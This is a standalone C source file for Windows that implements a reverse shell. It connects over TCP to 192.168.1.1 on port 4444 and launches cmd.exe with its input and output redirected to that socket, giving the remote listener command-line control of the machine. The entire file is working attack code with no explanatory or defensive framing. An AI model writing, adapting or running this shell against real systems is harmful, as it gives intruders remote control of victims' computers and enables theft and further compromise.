#include <winsock2.h>
#include <windows.h>
#include <string.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32.lib")

int main() {
    WSADATA wsaData;
    SOCKET Winsock;
    struct sockaddr_in hax;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (Winsock == INVALID_SOCKET) {
        printf("Socket creation failed!\n");
        return 1; }
  
    char* ip = "192.168.1.1";
    int port = 4444;
    struct hostent *host;
    host = gethostbyname(ip);
    char resolved_ip[16];
    strcpy(resolved_ip, inet_ntoa(*((struct in_addr *)host->h_addr)));

    hax.sin_family = AF_INET;
    hax.sin_port = htons(port);
    hax.sin_addr.s_addr = inet_addr(resolved_ip);
    if (WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        printf("Failed to connect to %s:%d\n", ip, port);
        return 1; }
    STARTUPINFO ini_processo;
    PROCESS_INFORMATION processo_info;

    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

    if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info)) {
        printf("Fail \n");
        return 1; }

    closesocket(Winsock);
    WSACleanup();

    return 0;
}
